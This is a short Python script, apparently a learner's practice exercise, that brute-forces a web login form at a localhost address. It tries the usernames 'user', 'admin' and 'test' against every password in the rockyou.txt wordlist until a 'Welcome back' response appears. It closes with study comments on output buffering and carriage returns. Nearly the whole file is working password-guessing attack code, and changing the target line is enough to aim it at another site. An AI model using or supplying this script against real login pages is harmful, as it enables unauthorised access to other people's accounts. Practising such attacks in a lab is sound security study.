import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["user", "admin", "test"]
passwords = "rockyou.txt"
success_message = "Welcome back"

for username in usernames:
	with open(passwords, 'r') as file:
		for password in file:
			password = password.strip("\n").encode('latin-1')
			sys.stdout.write(f"Attempting user:password -> {username}:{password.decode('latin-1')}\r")
			sys.stdout.flush()
			r = requests.post(target, data={"username": username, "password": password})
			if success_message.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write(f"\t[>>>] Valid password {password.decode('latin-1')} found for the user {username}")
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write(f"\tNo password found for {username}")
		sys.stdout.write("\n")


#Note:
#Buffer = temporary memory (in RAM) that holds output before showing on screen (doesnt store data)
#flush() = forces output to appear immediately (clears buffer to terminal)
#sys.stdout.write() gives more control (no newline, manual flush)
# \r = carriage return → moves cursor to start of the line (overwrites same line on screen)
